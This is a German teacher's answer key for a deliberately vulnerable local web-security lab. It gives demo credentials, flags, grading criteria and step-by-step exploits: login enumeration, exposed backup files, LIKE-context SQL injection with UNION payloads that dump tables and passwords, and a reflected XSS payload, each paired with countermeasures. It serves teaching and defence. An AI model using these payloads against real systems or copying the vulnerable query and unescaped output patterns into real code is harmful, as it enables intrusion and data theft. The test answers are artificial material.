# README_TEACHER.md – Lehrpersonendokumentation

> ⚠️ **NUR FÜR LEHRPERSONEN – NICHT AN STUDIERENDE WEITERGEBEN**
> Alle Payloads und Zugangsdaten sind ausschliesslich für diese lokale Demo-App bestimmt.
> **Nur lokal in dieser Demo-App verwenden.**

---

## Gültige Logins

| Benutzername | Passwort     | Rolle  |
|---|---|---|
| admin        | admin1234    | admin  |
| student      | student1234  | user   |
| bryan        | bryan1234    | user   |

**Passwortmuster:** `<benutzername>` + `1234`

---

## Schwachstellen – Lösungen

---

### 1. Login Enumeration (`/login`)

**Schwachstelle:**
Die App gibt unterschiedliche Fehlermeldungen zurück:
- Unbekannter Benutzername → `"Benutzername falsch"`
- Korrekter Benutzername, falsches Passwort → `"Passwort falsch"`

**Exploit-Vorgehen:**
1. Beliebige Benutzernamen testen: `admin`, `test`, `user`, `student`, `bryan`
2. Beobachten, welche Meldung erscheint
3. Passwort nach dem Muster `benutzername1234` versuchen

**Gefundene Flag nach Login:**
```
FLAG{LOGIN_ENUMERATION_ERFOLGREICH}
```
(Angezeigt auf dem Dashboard nach erfolgreichem Login)

**Gegenmassnahme:**
- Generische Fehlermeldung: *"Benutzername oder Passwort falsch"*
- Rate Limiting (max. 5 Versuche pro Minute)
- Account Lockout nach mehreren Fehlversuchen
- Logging verdächtiger Login-Versuche
- MFA optional

---

### 2. Sensitive File Exposure (`/backup/`)

**Fundorte:**
- `http://localhost:3000/robots.txt` → Eintrag: `Disallow: /backup/`
- `http://localhost:3000/backup/users.json` → Benutzerliste mit Passwörtern
- `http://localhost:3000/backup/flag.txt` → Flag

**Inhalte:**
```
/backup/users.json  →  JSON mit admin/student/bryan und Passwörtern
/backup/flag.txt    →  FLAG{USER_DATEI_GEFUNDEN}
```

**Hinweise im HTML-Quellcode von `/login`:**
```html
<!-- Backup files available under /backup/ -->
<a href="/backup/users.json" style="display:none">backup</a>
```

**Gegenmassnahme:**
- Sensible Dateien niemals im Webroot ablegen
- Backup-Verzeichnisse nicht über Express static ausliefern
- Zugriffsschutz (Authentifizierung) für administrative Pfade
- Secrets nie im Filesystem des Webservers speichern

---

### 3. SQL Injection (`/books/search?q=`)

**Schwachstelle:**
```javascript
// Verwundbare Abfrage in src/routes/books.js:
const sql = `SELECT id, title, author, category, price FROM books
             WHERE title LIKE '%${q}%' OR author LIKE '%${q}%'`;
```

**Exploit-Payloads (nur lokal in dieser Demo-App verwenden):**

> **Warum beginnen die Payloads mit `%'` statt nur `'`?**
>
> Die verwundbare Abfrage bettet den Eingabewert so ein:
> ```
> LIKE '%${q}%'
> ```
> Der Eingabewert `q` sitzt zwischen zwei `%`-Zeichen. Das **führende `%`** im Payload schließt das offene `%` des Templates sauber ab:
>
> | Payload | Resultierende SQL | Problem? |
> |---|---|---|
> | `' OR '1'='1` | `LIKE '%' OR '1'='1%'` | `'1'='1%'` → **false** (trailing `%` klebt an `1`) |
> | `%' OR '1'='1` | `LIKE '%%' OR '1'='1'` | `'1'='1'` → **true** ✓ |
>
> Ohne das `%` würde das Template-`%` am Ende an die nächste Zeichenkette kleben (`'1%'`) und den Vergleich kaputt machen.
>
> **Ist das üblich?** Ja – dieses Muster ist Standard bei LIKE-basierten SQL Injections. Immer wenn der Eingabewert innerhalb eines LIKE-Patterns eingebettet ist (`'%INPUT%'`), muss der Payload das umgebende Muster korrekt schließen. Bei anderen SQL-Kontexten (z.B. `WHERE id = '${q}'`) würde man einfach mit `'` beginnen.

#### Schritt 1: Testen ob SQLi möglich ist
```
%' OR '1'='1
```
→ Gibt alle Bücher zurück.

#### Schritt 2: Spaltenanzahl prüfen (UNION braucht 5 Spalten)
```
%' UNION SELECT 1,2,3,4,5--
```
→ Kein Fehler = 5 Spalten bestätigt.

#### Schritt 3: Datenbanktabellen auflisten
```
%' UNION SELECT type, name, tbl_name, rootpage, sql FROM sqlite_master--
```
→ Zeigt: `books`, `users`, `flags`

**Flag für Tabellen-Enumeration:** `FLAG{DATENBANK_TABELLEN_GEFUNDEN}` (in der flags-Tabelle)

#### Schritt 4: Inhalt der flags-Tabelle auslesen
```
%' UNION SELECT id, name, value, 'flag_table', 0 FROM flags--
```
→ Zeigt beide Flags aus der Tabelle.

#### Schritt 5: Benutzer aus users-Tabelle auslesen
```
%' UNION SELECT id, username, password, role, id FROM users--
```
→ Zeigt alle Benutzer mit Passwörtern (Klartextpasswörter!).

**Gefundene Flags:**
```
FLAG{SQL_INJECTION_ERFOLGREICH}
FLAG{DATENBANK_TABELLEN_GEFUNDEN}
```

**Gegenmassnahme:**
- Prepared Statements / Parameter Binding:
  ```javascript
  db.all('SELECT ... WHERE title LIKE ?', [`%${q}%`], callback);
  ```
- Niemals SQL per String-Konkatenation bauen
- Generische Fehlermeldungen (keine SQL-Fehler im Browser)
- Datenbankbenutzer mit minimalen Rechten (nur SELECT auf benötigte Tabellen)

---

### 4. Reflected XSS (`/xss?message=`)

**Schwachstelle:**
```ejs
<%- message %>
```
EJS `<%-` gibt den Wert als raw HTML aus (kein Escaping).

**Exploit-Payload (nur lokal in dieser Demo-App verwenden):**
```
<script>alert('FLAG{XSS_ERFOLGREICH}')</script>
```

Vollständige URL:
```
http://localhost:3000/xss?message=<script>alert('FLAG{XSS_ERFOLGREICH}')</script>
```

Oder über das Eingabefeld der XSS-Demo-Seite.

**Erwartetes Ergebnis:** Browser zeigt einen Alert mit `FLAG{XSS_ERFOLGREICH}`.

**Gegenmassnahme:**
- EJS `<%= message %>` statt `<%- message %>` verwenden (automatisches HTML-Escaping)
- Output Encoding für alle dynamischen Ausgaben
- Content Security Policy (CSP) Header:
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'
  ```
- Eingabevalidierung (Whitelist)

---

### 5. Information Disclosure (`/debug/error`)

**Sichtbare Informationen:**
- Interner Dateipfad zur SQLite-Datenbank
- Node.js Version
- Betriebssystem-Plattform
- Stack Trace mit internen Pfaden
- Hinweis auf verwendete Technologien (SQLite, Node.js)

**Gegenmassnahme:**
- Debug-Endpunkte in Produktion vollständig entfernen
- Technische Fehler nur intern loggen (z.B. mit winston oder pino)
- Generische Fehlerseite für den Browser (HTTP 500 ohne Details)
- Umgebungsvariable `NODE_ENV=production` setzen

---

## Erwartete OWASP ZAP Findings

| Finding | Kategorie | Ort |
|---|---|---|
| Directory Listing / Backup Files | Information Disclosure | /backup/ |
| SQL Injection | Injection | /books/search |
| Cross-Site Scripting (Reflected) | XSS | /xss |
| Credentials in Public File | Sensitive Data Exposure | /backup/users.json |
| robots.txt zeigt sensitive Pfade | Information Disclosure | /robots.txt |
| Session ohne Secure-Flag | Session Management | Cookies |
| Fehlermeldung verrät Stack Trace | Information Disclosure | /debug/error |

---

## Bewertungskriterien

| Kriterium | Punkte |
|---|---|
| Login Enumeration erkannt und dokumentiert | 10 |
| Backup-Datei gefunden (users.json) | 10 |
| Flag aus flag.txt ausgelesen | 5 |
| SQL Injection nachgewiesen (Fehlermeldung) | 10 |
| Datenbanktabellen per SQL Injection aufgelistet | 15 |
| flags-Tabelle per SQL Injection ausgelesen | 15 |
| XSS-Alert mit eigenem Payload ausgelöst | 10 |
| Information Disclosure dokumentiert | 5 |
| Korrekte Risikoeinstufung (OWASP Top 10 Bezug) | 10 |
| Gegenmassnahmen beschrieben | 10 |
| **Total** | **100** |

---

## Zeitplanung (45–60 min)

| Phase | Zeit |
|---|---|
| Setup & Einführung | 5 min |
| Aufgabe 1: Login Enumeration | 10 min |
| Aufgabe 2: OWASP ZAP Scan | 10 min |
| Aufgabe 3: SQL Injection | 15 min |
| Aufgabe 4: XSS | 10 min |
| Aufgabe 5: Dokumentation | 10 min |

---

## Didaktischer Hintergrund: SQL Injection – Kontextanalyse

Bevor ein SQL-Injection-Payload funktioniert, muss man verstehen, **in welchem SQL-Kontext** die Eingabe landet. Der Payload muss diesen Kontext zuerst korrekt schließen.

### Grundprinzip

```
[Kontext schließen] + [eigene SQL-Logik] + [Rest auskommentieren]
```

### Kontexte und ihre Payload-Präfixe

| SQL-Kontext im Code | Beispiel-SQL | Payload-Präfix |
|---|---|---|
| `WHERE id = '${q}'` | `WHERE id = 'INPUT'` | `'` |
| `WHERE title LIKE '%${q}%'` | `WHERE title LIKE '%INPUT%'` | `%'` |
| `WHERE id = ${q}` (ohne Quotes) | `WHERE id = INPUT` | direkt `1 OR 1=1` |
| `WHERE name = ("${q}")` | `WHERE name = ("INPUT")` | `")` |

### Warum `%'` bei LIKE-Abfragen?

Der Eingabewert `q` sitzt in `LIKE '%${q}%'` zwischen zwei `%`-Wildcards.

**Ohne führendes `%`:**
```
Eingabe:  ' OR '1'='1
SQL:      LIKE '%' OR '1'='1%'
                             ↑ Template-% klebt an '1' → '1'≠'1%' → false
```

**Mit führendem `%`:**
```
Eingabe:  %' OR '1'='1
SQL:      LIKE '%%' OR '1'='1'
                         ↑ sauberer Vergleich → true ✓
```

Das führende `%` schließt das offene `%` des Templates ab, sodass der nachfolgende Vergleich syntaktisch korrekt ist.

### Gleiches Prinzip bei UNION-Payloads

```
Eingabe:  %' UNION SELECT id, name, value, 'x', 0 FROM flags--
SQL:      LIKE '%%' UNION SELECT id, name, value, 'x', 0 FROM flags-- %'
                                                                       ↑ auskommentiert
```

Der `--` Kommentar sorgt dafür, dass das übrig bleibende `%'` aus dem Template ignoriert wird.

### Lernziel für Studierende

> **Zuerst den Kontext analysieren, dann den Payload anpassen** – nicht blind Copy-Paste aus dem Internet. Ein Payload, der in einem anderen Kontext funktioniert, kann hier scheitern.

---

## Datenbankstruktur

```sql
-- Tabellen
books  (id, title, author, category, price)
users  (id, username, password, role)
flags  (id, name, value)

-- Flags-Einträge
sql_injection    → FLAG{SQL_INJECTION_ERFOLGREICH}
hidden_admin_data → FLAG{DATENBANK_TABELLEN_GEFUNDEN}
```

---

> ⚠️ **ERINNERUNG:** Alle Payloads und Zugangsdaten sind ausschliesslich für diese lokale Demo-App bestimmt.
> **Nur lokal in dieser Demo-App verwenden.**
